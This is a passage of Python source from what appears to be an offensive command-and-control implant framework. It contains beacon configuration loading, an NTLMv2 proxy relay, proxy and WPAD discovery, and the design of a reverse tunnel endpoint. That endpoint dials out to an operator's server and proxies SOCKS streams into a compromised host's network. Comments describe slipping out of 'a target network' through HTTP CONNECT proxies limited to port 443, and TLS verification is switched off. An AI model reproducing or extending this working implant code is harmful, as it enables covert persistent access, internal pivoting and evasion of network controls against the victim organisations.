    `beacon_config_from_fallback` leaves the block out and logs, because
    the beacon is the access and the tunnel is the convenience.
    """
    tunnel = c2_cfg.get("tunnel") if isinstance(c2_cfg, dict) else None
    if tunnel is None:
        return None
    if not isinstance(tunnel, dict):
        raise ValueError("c2.tunnel is %s, not a mapping"
                         % type(tunnel).__name__)
    if "psk" in tunnel:
        raise ValueError(
            "c2.tunnel.psk is not read from this file: it is the whole "
            "credential, and a shared secret does not belong in something "
            "somebody will paste into a ticket. Delete the key and put the "
            "value in %s instead, the way "
            "services/raccoon-tunnel.service does with an EnvironmentFile."
            % _TUNNEL_PSK_ENV)

    enabled = bool(tunnel.get("enabled"))
    psk = ""
    if enabled:
        source = os.environ if env is None else env
        supplied = source.get(_TUNNEL_PSK_ENV, "")
        problem = None
        try:
            _tunnel_key(supplied, _TUNNEL_PSK_ENV,
                        "this host's pre-shared key")
        except ValueError as exc:
            problem = str(exc)
        if problem:
            # Raised outside the except block, as `_tunnel_key` raises its
            # own: nothing that touched the value may ride along in the
            # exception chain.
            raise ValueError(
                "%s, and c2.tunnel is enabled. It is deliberately not in "
                "the config file; see services/raccoon-tunnel.service"
                % problem)
        psk = supplied.strip()

    # Every field, always, so this and the generator produce one shape.
    # `server`, `port`, `public_key` and `identity` are passed through
    # untouched rather than defaulted, so that a block which cannot work
    # is named by `tunnel_config_problem` below and not quietly completed
    # here into something that dials the wrong place.
    block = {
        "enabled": enabled,
        "server": tunnel.get("server", ""),
        "port": tunnel.get("port"),
        "public_key": tunnel.get("public_key", ""),
        "psk": psk,
        "identity": tunnel.get("identity", ""),
        "keepalive_seconds": tunnel.get("keepalive_seconds",
                                        _DEFAULT_KEEPALIVE),
        "allow_slow_crypto": bool(tunnel.get("allow_slow_crypto")),
    }
    problem = tunnel_config_problem({"c2": {"tunnel": block}})
    if problem:
        raise ValueError(problem)
    return block


def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True,
                                env=None) -> dict:
    """Build a Beacon config from a `c2` block of `configs/raccoon.yaml`.

    Reads `c2.fallback.*`, which is the **beacon** side of the file: the
    channels an implant on this host will try. `c2.listeners` is the
    server side and is read by `listeners.registry` instead.

    A transport absent from the file becomes an empty mapping, which the
    beacon reads as disabled. That is why this cannot simply pass the
    fallback block through: the beacon expects its transports at the top
    of its own `c2` block, not nested under `fallback`.

    `c2.tunnel` comes through `tunnel_config_from_yaml` and lands at
    `c2.tunnel` of the config this returns, which is where both `Beacon`
    and `TunnelEndpoint` look for it.

    **A tunnel this host cannot run does not cost it its beacon, and does
    not lose its reason either.** That loader refuses a block it cannot
    make, naming the field. Here the block is left out -- it is the only
    one there is, and in the `psk`-in-the-file case it is the one holding
    the file's secret, so handing it on would let `tunnel start` dial
    with the value this rule exists to refuse. What is kept is the
    reason, at `c2.tunnel_problem`, which `Beacon._tunnel_start` answers
    the operator with. Without it `tunnel_mode_problem` would take its
    no-block arm and say "generate the build with the tunnel enabled",
    which is false and unactionable advice for a host whose tunnel came
    from a file.

    The beacon starts either way, because it is the access and the tunnel
    is the convenience. The log line is a second channel and not the only
    one: this function is reached only when Sliver is unavailable and
    `c2.fallback.enabled` is true, and it writes to a rotating file, so a
    refusal that lived only there would be a refusal nobody saw.
    """
    fallback = c2_cfg.get("fallback") or {}
    block = {
        "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
        "jitter_percent": c2_cfg.get("jitter_percent", 20),
        "encryption_key": c2_cfg.get("encryption_key", ""),
        "proxy": c2_cfg.get("proxy", {}),
        "dropbox": dropbox,
    }
    for transport in _FALLBACK_TRANSPORTS:
        block[transport] = fallback.get(transport, {})
    try:
        tunnel = tunnel_config_from_yaml(c2_cfg, env=env)
    except ValueError as exc:
        logger.error("c2.tunnel cannot be used and has been left out of "
                     "this config: %s", exc)
        block["tunnel_problem"] = str(exc)
        tunnel = None
    if tunnel is not None:
        block["tunnel"] = tunnel
    return {"c2": block}


# ── Stdlib HTTP client ──

class _HttpSession:
    """Minimal HTTP session using urllib — replaces requests.Session."""

    def __init__(self):
        self.proxies: dict = {}
        self.trust_env: bool = True
        self._cookie_jar = urllib.request.HTTPCookieProcessor()

    def _build_opener(self):
        handlers = [self._cookie_jar]
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        keylog = os.environ.get("SSLKEYLOGFILE")
        if keylog and hasattr(ssl_ctx, "keylog_filename"):
            ssl_ctx.keylog_filename = keylog
        handlers.append(urllib.request.HTTPSHandler(context=ssl_ctx))

        if self.proxies:
            handlers.append(urllib.request.ProxyHandler(self.proxies))
        elif not self.trust_env:
            handlers.append(urllib.request.ProxyHandler({}))

        return urllib.request.build_opener(*handlers)

    def post(self, url: str, json_data: dict, headers: dict,
             timeout: float = 30) -> "_HttpResponse":
        body = json.dumps(json_data, separators=(",", ":")).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        for k, v in headers.items():
            req.add_header(k, v)
        if "Content-Type" not in headers:
            req.add_header("Content-Type", "application/json")

        opener = self._build_opener()
        try:
            resp = opener.open(req, timeout=timeout)
            return _HttpResponse(resp.getcode(), resp.read())
        except urllib.error.HTTPError as e:
            return _HttpResponse(e.code, e.read() if hasattr(e, "read") else b"")
        except urllib.error.URLError as e:
            if "proxy" in str(e.reason).lower() or "tunnel" in str(e.reason).lower():
                raise _ProxyError(str(e.reason)) from e
            raise

    def head(self, url: str, timeout: float = 10) -> "_HttpResponse":
        req = urllib.request.Request(url, method="HEAD")
        opener = self._build_opener()
        try:
            resp = opener.open(req, timeout=timeout)
            return _HttpResponse(resp.getcode(), b"")
        except urllib.error.HTTPError as e:
            return _HttpResponse(e.code, b"")


class _HttpResponse:
    def __init__(self, status_code: int, body: bytes):
        self.status_code = status_code
        self._body = body

    def json(self) -> dict:
        return json.loads(self._body)


class _ProxyError(Exception):
    pass


# ── NTLM Proxy Relay ──

class _NtlmProxyRelay:
    """Local CONNECT proxy that handles NTLMv2 auth to an upstream corporate proxy.

    Listens on 127.0.0.1:<random-port>, accepts CONNECT requests from urllib,
    performs the NTLM 3-step handshake on a single TCP connection to the upstream
    proxy, then bridges the raw TCP tunnel bidirectionally.

    This solves the problem where WinINet/urllib cannot do NTLM proxy auth with
    cross-domain credentials (user is not in the proxy's AD domain).
    """

    # Header read guards — a hostile/broken proxy must not be able to make us
    # allocate unbounded memory while parsing the CONNECT response.
    _MAX_LINE = 8192
    _MAX_HEADERS = 100
    # Idle timeout for the handshake only. Cleared before bridging so that a
    # long-lived tunnel is never torn down mid-transfer.
    _HANDSHAKE_TIMEOUT = 30

    def __init__(self, upstream_host: str, upstream_port: int,
                 username: str, password: str, domain: str = "",
                 workstation: str = ""):
        self._upstream = (upstream_host, upstream_port)
        self._user, self._domain = self._split_identity(username, domain)
        self._password = password
        self._workstation = (workstation or platform.node() or "WORKSTATION")
        self._listen_port = 0
        self._server: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    @staticmethod
    def _split_identity(username: str, domain: str) -> tuple:
        """Accept 'DOMAIN\\user', 'user@domain' or a separate domain argument."""
        user = username or ""
        if not domain:
            if "\\" in user:
                domain, user = user.split("\\", 1)
            elif "/" in user:
                domain, user = user.split("/", 1)
            elif "@" in user:
                user, domain = user.split("@", 1)
        return user, domain or ""

    @property
    def port(self) -> int:
        return self._listen_port

    @property
    def url(self) -> str:
        return f"http://127.0.0.1:{self._listen_port}"

    @property
    def upstream_url(self) -> str:
        return f"http://{self._upstream[0]}:{self._upstream[1]}"

    @property
    def identity(self) -> str:
        return f"{self._domain}\\{self._user}" if self._domain else self._user

    def start(self) -> int:
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind(("127.0.0.1", 0))
        self._listen_port = self._server.getsockname()[1]
        self._server.listen(20)
        self._running = True
        self._thread = threading.Thread(
            target=self._accept_loop, daemon=True, name="ntlm-proxy-relay")
        self._thread.start()
        logger.info("NTLM proxy relay on 127.0.0.1:%d -> %s:%d (identity: %s, workstation: %s)",
                    self._listen_port, self._upstream[0], self._upstream[1],
                    self.identity, self._workstation)
        return self._listen_port

    def stop(self):
        self._running = False
        if self._server:
            try:
                self._server.close()
            except Exception:
                pass
            self._server = None
        if self._thread:
            self._thread.join(timeout=2)
            self._thread = None

    def _accept_loop(self):
        while self._running:
            try:
                client, _ = self._server.accept()
            except OSError:
                # Listening socket closed by stop() — normal shutdown.
                break
            except Exception as e:
                logger.debug("NTLM relay accept error: %s", e)
                continue
            try:
                threading.Thread(
                    target=self._handle_client, args=(client,), daemon=True).start()
            except Exception as e:
                logger.debug("NTLM relay spawn error: %s", e)
                try:
                    client.close()
                except Exception:
                    pass

    def _handle_client(self, client: socket.socket):
        upstream = None
        try:
            client.settimeout(self._HANDSHAKE_TIMEOUT)
            request_line = self._read_line(client)
            self._drain_headers(client)

            if not request_line or not request_line.startswith("CONNECT"):
                self._send_error(client, "405 Method Not Allowed")
                return

            parts = request_line.split(" ")
            if len(parts) < 2:
                self._send_error(client, "400 Bad Request")
                return
            target = parts[1]

            upstream = self._connect_upstream()

            # Step 1: CONNECT without auth. Either the proxy lets us straight
            # through, or it answers 407 and offers NTLM.
            self._send_connect(upstream, target, None)
            status, challenge, closed = self._read_response(upstream)

            if status and " 200" in status:
                logger.debug("NTLM relay: upstream needs no auth for %s", target)
                self._establish(client, upstream)
                return

            # Type 1 and Type 3 must travel over the same TCP connection. If the
            # proxy closed it after the 407, open a fresh one.
            if closed:
                upstream.close()
                upstream = self._connect_upstream()

            # Step 2: CONNECT with Type 1 → expect 407 + Type 2 challenge.
            type1 = self._make_type1()
            self._send_connect(upstream, target,
                               "NTLM " + base64.b64encode(type1).decode())
            _, type2_b64, closed = self._read_response(upstream)

            if not type2_b64:
                logger.debug("NTLM relay: no Type 2 challenge from upstream proxy")
                self._send_error(client, "502 Bad Gateway")
                return
            if closed:
                logger.debug("NTLM relay: upstream closed connection mid-handshake")
                self._send_error(client, "502 Bad Gateway")
                return

            # Step 3: CONNECT with Type 3 → expect 200.
            try:
                type2 = base64.b64decode(type2_b64)
            except Exception:
                logger.debug("NTLM relay: malformed Type 2 challenge")
                self._send_error(client, "502 Bad Gateway")
                return

            type3 = self._make_type3(type2)
            self._send_connect(upstream, target,
                               "NTLM " + base64.b64encode(type3).decode())
            status, _, _ = self._read_response(upstream)

            if status and " 200" in status:
                self._establish(client, upstream)
            else:
                logger.debug("NTLM relay: auth rejected by upstream (%s)", status)
                self._send_error(client, "407 Proxy Authentication Required")
        except Exception as e:
            logger.debug("NTLM relay client error: %s", e)
        finally:
            try:
                client.close()
            except Exception:
                pass
            if upstream:
                try:
                    upstream.close()
                except Exception:
                    pass

    def _connect_upstream(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self._HANDSHAKE_TIMEOUT)
        sock.connect(self._upstream)
        return sock

    def _establish(self, client: socket.socket, upstream: socket.socket):
        """Confirm the tunnel to the local client and start bridging."""
        client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        # Blocking mode for the tunnel: the handshake timeout must not kill a
        # long-lived or slow transfer.
        client.settimeout(None)
        upstream.settimeout(None)
        self._bridge(client, upstream)

    def _drain_headers(self, sock: socket.socket):
        for _ in range(self._MAX_HEADERS):
            if not self._read_line(sock):
                return

    def _send_connect(self, sock: socket.socket, target: str,
                      auth: Optional[str]):
        msg = f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n"
        if auth:
            msg += f"Proxy-Authorization: {auth}\r\n"
        msg += "Proxy-Connection: Keep-Alive\r\n\r\n"
        sock.sendall(msg.encode())

    def _read_response(self, sock: socket.socket) -> tuple:
        """Read a proxy response. Returns (status_line, ntlm_challenge, closed)."""
        ntlm_challenge = None
        status_line = self._read_line(sock)
        body_len = 0
        closed = False
        for _ in range(self._MAX_HEADERS):
            line = self._read_line(sock)
            if not line:
                break
            lower = line.lower()
            if lower.startswith("proxy-authenticate:") and "ntlm" in lower:
                value = line.split(":", 1)[1].strip()
                # "NTLM" alone is just the offer; "NTLM <base64>" is the challenge.
                if len(value) > 5:
                    ntlm_challenge = value[5:].strip() or None
            elif lower.startswith("content-length:"):
                try:
                    body_len = int(line.split(":", 1)[1].strip())
                except ValueError:
                    pass
            elif lower.startswith(("connection:", "proxy-connection:")):
                if "close" in lower:
                    closed = True
        # Swallow any error body so the socket stays usable for the next step.
        remaining = body_len
        while remaining > 0:
            chunk = sock.recv(min(remaining, 4096))
            if not chunk:
                closed = True
                break
            remaining -= len(chunk)
        return status_line, ntlm_challenge, closed

    def _bridge(self, s1: socket.socket, s2: socket.socket):
        def forward(src, dst):
            try:
                while True:
                    data = src.recv(8192)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception:
                pass
            # Half-close the peer so it sees EOF and can finish its own direction.
            try:
                dst.shutdown(socket.SHUT_WR)
            except Exception:
                pass

        t1 = threading.Thread(target=forward, args=(s1, s2), daemon=True)
        t2 = threading.Thread(target=forward, args=(s2, s1), daemon=True)
        t1.start()
        t2.start()
        # Wait for BOTH directions. Joining only one would let the caller's
        # finally-block close the sockets and truncate the in-flight response.
        t1.join()
        t2.join()

    def _read_line(self, sock: socket.socket) -> Optional[str]:
        buf = []
        while len(buf) < self._MAX_LINE:
            b = sock.recv(1)
            if not b:
                return None if not buf else "".join(buf)
            c = b[0]
            if c == 10:  # LF
                break
            if c != 13:  # skip CR
                buf.append(chr(c))
        return "".join(buf)

    def _send_error(self, sock: socket.socket, status: str):
        try:
            sock.sendall(
                f"HTTP/1.1 {status}\r\nContent-Length: 0\r\n"
                f"Connection: close\r\n\r\n".encode())
        except Exception:
            pass

    # ── NTLMv2 message construction (stdlib only, no dependencies) ──

    # NEGOTIATE_UNICODE | NEGOTIATE_OEM | REQUEST_TARGET | NEGOTIATE_NTLM
    # | NEGOTIATE_ALWAYS_SIGN | NEGOTIATE_EXTENDED_SESSIONSECURITY
    _NEGOTIATE_FLAGS_TYPE1 = 0x00088207
    # Same minus OEM/REQUEST_TARGET — unicode only for the authenticate message.
    _NEGOTIATE_FLAGS_TYPE3 = 0x00088201

    def _make_type1(self) -> bytes:
        msg = bytearray(32)
        msg[0:7] = b"NTLMSSP"
        msg[8] = 1  # Type 1
        struct.pack_into("<I", msg, 12, self._NEGOTIATE_FLAGS_TYPE1)
        return bytes(msg)

    def _make_type3(self, type2: bytes) -> bytes:
        if len(type2) < 32 or not type2.startswith(b"NTLMSSP\x00"):
            raise ValueError("invalid NTLM Type 2 message")

        challenge = type2[24:32]
        target_info = b""
        if len(type2) >= 48:
            ti_len = struct.unpack_from("<H", type2, 40)[0]
            ti_off = struct.unpack_from("<I", type2, 44)[0]
            if ti_off + ti_len <= len(type2):
                target_info = type2[ti_off:ti_off + ti_len]

        # NTLMv2: the identity blob is upper(user) + domain, domain NOT uppercased.
        nt_hash = self._md4(self._password.encode("utf-16-le"))
        identity = (self._user.upper() + self._domain).encode("utf-16-le")
        ntv2_hash = self._hmac_md5(nt_hash, identity)

        client_challenge = os.urandom(8)
        timestamp = struct.pack("<Q", int((time.time() + 11644473600) * 10000000))

        blob = io.BytesIO()
        blob.write(b"\x01\x01\x00\x00")  # RespType 1, HiRespType 1, Z(2)
        blob.write(b"\x00" * 4)           # Z(4)
        blob.write(timestamp)
        blob.write(client_challenge)
        blob.write(b"\x00" * 4)           # Z(4)
        blob.write(target_info)
        blob.write(b"\x00" * 4)           # Z(4)
        blob_bytes = blob.getvalue()

        nt_proof = self._hmac_md5(ntv2_hash, challenge + blob_bytes)
        nt_response = nt_proof + blob_bytes

        domain_bytes = self._domain.encode("utf-16-le")
        user_bytes = self._user.encode("utf-16-le")
        ws_bytes = self._workstation.upper().encode("utf-16-le")
        # EncryptedRandomSessionKey stays empty: we never set NEGOTIATE_KEY_EXCH,
        # and a populated field without that flag makes some proxies reject us.
        session_key = b""

        # Payload starts after the 64-byte header + 8-byte Version + 16-byte MIC.
        payload_off = 88
        domain_off = payload_off
        user_off = domain_off + len(domain_bytes)
        ws_off = user_off + len(user_bytes)
        lm_off = ws_off + len(ws_bytes)
        nt_off = lm_off  # LM response is empty, so it shares the offset
        sk_off = nt_off + len(nt_response)

        msg = bytearray(sk_off + len(session_key))
        msg[0:7] = b"NTLMSSP"
        msg[8] = 3  # Type 3
        struct.pack_into("<I", msg, 60, self._NEGOTIATE_FLAGS_TYPE3)
        struct.pack_into("<HHI", msg, 12, 0, 0, lm_off)  # LM response (empty)
        struct.pack_into("<HHI", msg, 20, len(nt_response), len(nt_response), nt_off)
        struct.pack_into("<HHI", msg, 28, len(domain_bytes), len(domain_bytes), domain_off)
        struct.pack_into("<HHI", msg, 36, len(user_bytes), len(user_bytes), user_off)
        struct.pack_into("<HHI", msg, 44, len(ws_bytes), len(ws_bytes), ws_off)
        struct.pack_into("<HHI", msg, 52, len(session_key), len(session_key), sk_off)

        msg[domain_off:domain_off + len(domain_bytes)] = domain_bytes
        msg[user_off:user_off + len(user_bytes)] = user_bytes
        msg[ws_off:ws_off + len(ws_bytes)] = ws_bytes
        msg[nt_off:nt_off + len(nt_response)] = nt_response
        return bytes(msg)

    @staticmethod
    def _hmac_md5(key: bytes, data: bytes) -> bytes:
        import hmac as _hmac
        return _hmac.new(key, data, hashlib.md5).digest()

    @staticmethod
    def _md4(data: bytes) -> bytes:
        """Pure-Python MD4 (needed for NT hash, not available in hashlib)."""
        def _rl(x, n):
            return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
        def _r1(a, b, c, d, x, s):
            return _rl((a + ((b & c) | (~b & d)) + x) & 0xFFFFFFFF, s)
        def _r2(a, b, c, d, x, s):
            return _rl((a + ((b & c) | (b & d) | (c & d)) + x + 0x5A827999) & 0xFFFFFFFF, s)
        def _r3(a, b, c, d, x, s):
            return _rl((a + (b ^ c ^ d) + x + 0x6ED9EBA1) & 0xFFFFFFFF, s)

        length = len(data)
        pad_len = (56 - (length + 1) % 64 + 64) % 64
        padded = data + b"\x80" + b"\x00" * pad_len + struct.pack("<Q", length * 8)

        st = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
        for i in range(0, len(padded), 64):
            x = struct.unpack_from("<16I", padded, i)
            a, b, c, d = st
            for j in range(16):
                a, b, c, d = d, _r1(a, b, c, d, x[j], [3,7,11,19][j%4]), b, c
            for j in range(16):
                idx = [0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15][j]
                a, b, c, d = d, _r2(a, b, c, d, x[idx], [3,5,9,13][j%4]), b, c
            for j in range(16):
                idx = [0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15][j]
                a, b, c, d = d, _r3(a, b, c, d, x[idx], [3,9,11,15][j%4]), b, c
            st = [(st[0]+a) & 0xFFFFFFFF, (st[1]+b) & 0xFFFFFFFF,
                  (st[2]+c) & 0xFFFFFFFF, (st[3]+d) & 0xFFFFFFFF]
        return struct.pack("<4I", *st)


# ── Proxy discovery ──

class ProxyDiscovery:
    """Discovers HTTP/HTTPS proxies from environment, system settings, PAC/WPAD, and px."""

    def __init__(self):
        self._discovered: list[dict] = []
        self._active_proxy: Optional[dict] = None

    def discover_all(self) -> list[dict]:
        self._discovered = []
        self._detect_px_proxy()
        self._detect_env_proxy()
        self._detect_system_proxy()
        self._detect_wpad()
        seen = set()
        unique = []
        for p in self._discovered:
            key = p.get("url", "")
            if key and key not in seen:
                seen.add(key)
                unique.append(p)
        self._discovered = unique
        return self._discovered

    @property
    def proxies(self) -> list[dict]:
        return self._discovered

    @property
    def active(self) -> Optional[dict]:
        return self._active_proxy

    def get_urllib_proxies(self) -> Optional[dict]:
        if not self._active_proxy:
            return None
        url = self._active_proxy["url"]
        return {"http": url, "https": url}

    def select_working(self, test_url: str, timeout: float = 10) -> Optional[dict]:
        for proxy in self._discovered:
            try:
                proxy_handler = urllib.request.ProxyHandler({
                    "http": proxy["url"], "https": proxy["url"],
                })
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
                opener = urllib.request.build_opener(
                    proxy_handler,
                    urllib.request.HTTPSHandler(context=ssl_ctx),
                )
                req = urllib.request.Request(test_url, method="HEAD")
                resp = opener.open(req, timeout=timeout)
                if resp.getcode() < 500:
                    self._active_proxy = proxy
                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
                    return proxy
            except urllib.error.HTTPError as e:
                if e.code < 500:
                    self._active_proxy = proxy
                    logger.info("Proxy working: %s (%s)", proxy["url"], proxy["source"])
                    return proxy
            except Exception:
                logger.debug("Proxy failed: %s", proxy["url"])
        self._active_proxy = None
        return None

    def _detect_px_proxy(self):
        for port in (3128, 8080, 8888):
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect(("127.0.0.1", port))
                self._discovered.append({
                    "url": f"http://127.0.0.1:{port}",
                    "source": f"px-proxy (localhost:{port})",
                    "auth": "ntlm-passthrough",
                })
            except Exception:
                pass
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass

    def _detect_env_proxy(self):
        for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy",
                     "ALL_PROXY", "all_proxy"):
            val = os.environ.get(var, "").strip()
            if val:
                if not val.startswith(("http://", "https://", "socks")):
                    val = "http://" + val
                self._discovered.append({
                    "url": val,
                    "source": f"env:{var}",
                    "auth": "from-url" if "@" in val else "none",
                })

    def _detect_system_proxy(self):
        if platform.system() == "Windows":
            self._detect_windows_proxy()
        elif platform.system() == "Darwin":
            self._detect_macos_proxy()
        else:
            self._detect_linux_proxy()

    def _detect_windows_proxy(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
            enabled, _ = winreg.QueryValueEx(key, "ProxyEnable")
            if enabled:
                server, _ = winreg.QueryValueEx(key, "ProxyServer")
                if server:
                    if "=" in server:
                        for part in server.split(";"):
                            if "=" in part:
                                proto, addr = part.split("=", 1)
                                if proto.lower() in ("http", "https"):
                                    url = addr if addr.startswith("http") else f"http://{addr}"
                                    self._discovered.append({
                                        "url": url, "source": "windows-registry",
                                        "auth": "ntlm-possible",
                                    })
                    else:
                        url = server if server.startswith("http") else f"http://{server}"
                        self._discovered.append({
                            "url": url, "source": "windows-registry",
                            "auth": "ntlm-possible",
                        })
            try:
                pac_url, _ = winreg.QueryValueEx(key, "AutoConfigURL")
                if pac_url:
                    self._discovered.append({
                        "url": pac_url, "source": "windows-pac",
                        "auth": "pac", "is_pac": True,
                    })
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass

    def _detect_linux_proxy(self):
        try:
            r = subprocess.run(
                ["gsettings", "get", "org.gnome.system.proxy", "mode"],
                capture_output=True, text=True, timeout=3,
            )
            mode = r.stdout.strip().strip("'")
            if mode == "manual":
                for proto in ("http", "https"):
                    host_r = subprocess.run(
                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "host"],
                        capture_output=True, text=True, timeout=3,
                    )
                    port_r = subprocess.run(
                        ["gsettings", "get", f"org.gnome.system.proxy.{proto}", "port"],
                        capture_output=True, text=True, timeout=3,
                    )
                    host = host_r.stdout.strip().strip("'")
                    port = port_r.stdout.strip()
                    if host:
                        self._discovered.append({
                            "url": f"http://{host}:{port or '8080'}",
                            "source": f"gnome-{proto}",
                            "auth": "none",
                        })
            elif mode == "auto":
                pac_r = subprocess.run(
                    ["gsettings", "get", "org.gnome.system.proxy", "autoconfig-url"],
                    capture_output=True, text=True, timeout=3,
                )
                pac = pac_r.stdout.strip().strip("'")
                if pac:
                    self._discovered.append({
                        "url": pac, "source": "gnome-pac",
                        "auth": "pac", "is_pac": True,
                    })
        except Exception:
            pass

    def _detect_macos_proxy(self):
        try:
            r = subprocess.run(
                ["networksetup", "-getwebproxy", "Wi-Fi"],
                capture_output=True, text=True, timeout=5,
            )
            info = {}
            for line in r.stdout.splitlines():
                if ":" in line:
                    k, v = line.split(":", 1)
                    info[k.strip().lower()] = v.strip()
            if info.get("enabled") == "Yes":
                host = info.get("server", "")
                port = info.get("port", "8080")
                if host:
                    self._discovered.append({
                        "url": f"http://{host}:{port}",
                        "source": "macos-networksetup",
                        "auth": "none",
                    })
        except Exception:
            pass

    def _detect_wpad(self):
        try:
            addr = socket.gethostbyname("wpad")
            if addr:
                wpad_url = f"http://{addr}/wpad.dat"
                self._discovered.append({
                    "url": wpad_url, "source": "wpad-dns",
                    "auth": "wpad", "is_pac": True,
                })
        except Exception:
            pass
        try:
            fqdn = socket.getfqdn()
            parts = fqdn.split(".")
            if len(parts) > 1:
                domain = ".".join(parts[1:])
                wpad_host = f"wpad.{domain}"
                addr = socket.gethostbyname(wpad_host)
                if addr:
                    wpad_url = f"http://{addr}/wpad.dat"
                    self._discovered.append({
                        "url": wpad_url, "source": f"wpad-domain ({domain})",
                        "auth": "wpad", "is_pac": True,
                    })
        except Exception:
            pass

    def summary(self) -> str:
        if not self._discovered:
            return "No proxies discovered — using direct connection"
        lines = [f"Discovered {len(self._discovered)} proxy candidate(s):"]
        for i, p in enumerate(self._discovered):
            active = " [ACTIVE]" if p == self._active_proxy else ""
            lines.append(f"  [{i+1}] {p['url']} ({p['source']}, auth={p.get('auth','?')}){active}")
        return "\n".join(lines)


# ── The tunnel endpoint ──
#
# The far end of the tunnel: it connects out, holds one command channel
# open, and on request opens further connections that each proxy one TCP
# stream into its own network. `software/c2/tunnel/server.py` is the other
# half and the authority on the protocol; the shape, briefly:
#
#   * one connection to one port, carrying a Noise `NKpsk0` handshake
#     whose first payload is a `HELLO` -- that connection is the command
#     channel the server holds;
#   * an `OPEN_RELAY(port, token)` down it per session the operator opens;
#   * a **second connection to the same port** whose first payload is a
#     `RELAY(token)`, which the server splices to the operator's SOCKS
#     client.
#
# One port for both, because the usual way out of a target network is an
# HTTP `CONNECT` proxy that permits 443 and nothing else: Squid ships
# `acl SSL_ports port 443` with `http_access deny CONNECT !SSL_ports`, so
# the dial-back-to-a-fresh-high-port design this derives from could not
# form a tunnel at all from most hosts. The 32-byte token does the job
# that port used to, cryptographically rather than by arrival order.
#
# **Getting out is tried in order: a configured proxy, then
# `ProxyDiscovery`, then direct.** The published original did a bare
# `socket.connect((ip, 443))` and could not cross a proxy at all; that is
# the gap this closes, and most hosts this runs on have no other way out.
# When a proxy is used this writes its own `CONNECT <server>:<port>` and
# then speaks Noise over the tunnelled stream, because what follows is not
# HTTP and urllib would own the socket. `_NtlmProxyRelay` is a *local*
# CONNECT proxy that handles NTLM against an upstream, so a build
# configured for NTLM dials `127.0.0.1:<its port>` and writes an ordinary
# CONNECT to it.
#
# Three sharp edges in the layers below, handled here because this is the
# caller they defer to:
#
#   * **`NoiseSession.decrypt` does not retire the session on an
#     authentication failure.** Noise §5.1 says a session must be
#     abandoned after a DECRYPT failure; that class leaves the policy to
#     its caller, so a `ValueError` out of `decrypt` closes the
#     connection here.
#   * **`read_frame` cannot tell an orderly teardown from a malformed
#     peer.** A clean EOF between frames raises `ValueError` just as a
#     truncated frame does, and a stall past the socket timeout raises
#     `socket.timeout`, which is an `OSError`. `_bytes_waiting` moves the
#     distinction into the socket API -- one `MSG_PEEK`, where `b""` is a
#     FIN with nothing behind it -- and it is used in the two places the
#     difference changes what is done: the command loop, where a FIN is an
#     ordinary reconnect and a bad frame is worth a warning, and the
#     relay's return direction, for the same reason. Where it changes
#     nothing -- reading the one SOCKS request a relay is owed -- it is not
#     used, and the comment there says so.
#   * **`write_frame`'s single `sendall` does not make concurrent writes
#     safe**; it loops over partial sends and releases the GIL. The
#     command channel has two writers, the command loop's PONG and the
#     keep-alive thread's PING, so every write to it goes through
#     `_TunnelChannel.send` and its lock -- and the lock covers `encrypt`
#     too, because the nonce it advances has to be ordered with the frame
#     it belongs to. A relay needs no lock and has an invariant instead:
#     exactly one thread writes each of its two sockets, which the bridge
#     documents.
#
# Keep-alive is `MSG_PING` / `MSG_PONG`, and not a zero-valued port, which
# is the original's published trait -- the frame layer refuses the `00 00`
# that would be.

# How long the command loop blocks in a read before it looks at the stop
# flag again. Bounded so that `stop` does not wait out an idle timeout,
# and so the loop does not depend on a closed socket waking a blocked
# `recv`, which is not reliable on every platform.
_CONTROL_POLL = 1.0

# Bounds on the keep-alive tick, as on the server: the floor keeps a test
# with a 100 ms interval honest, and the ceiling bounds how late a PING
# can be whatever the configured interval is.
_KEEPALIVE_TICK_FLOOR = 0.02
_KEEPALIVE_TICK_CEILING = 1.0

_DEFAULT_KEEPALIVE = 30.0
_DEFAULT_CONNECT_TIMEOUT = 30.0

# The reconnect backoff, the shape `Beacon._backoff_sleep` already uses:
# a base delay, 1.5 per consecutive failure, a ceiling, and up to 20%
# jitter on top. A dropped command channel is an ordinary event -- a
# server restart, a proxy recycling an idle tunnel -- so the endpoint
# reconnects rather than exiting, and the module constants are what a test
# moves to avoid waiting out a real delay.
_TUNNEL_RETRY_BASE = 5.0
_TUNNEL_RETRY_CEILING = 300.0

# One read fills at most one frame: the plaintext ceiling of a Noise
# message, so nothing has to be split twice.
_TUNNEL_CHUNK = MAX_PAYLOAD_LEN

# How long a thread is waited for at teardown. Both directions of a bridge
# are unparked by a shutdown rather than left to notice on their own, so
# this bounds a pathology and not the normal path.
_TUNNEL_JOIN_TIMEOUT = 5.0

# Guards on a proxy's CONNECT response, the same two `_NtlmProxyRelay`
# has: a broken or hostile proxy must not be able to make this allocate
# without bound while parsing a reply.
_PROXY_MAX_LINE = 8192
_PROXY_MAX_HEADERS = 100

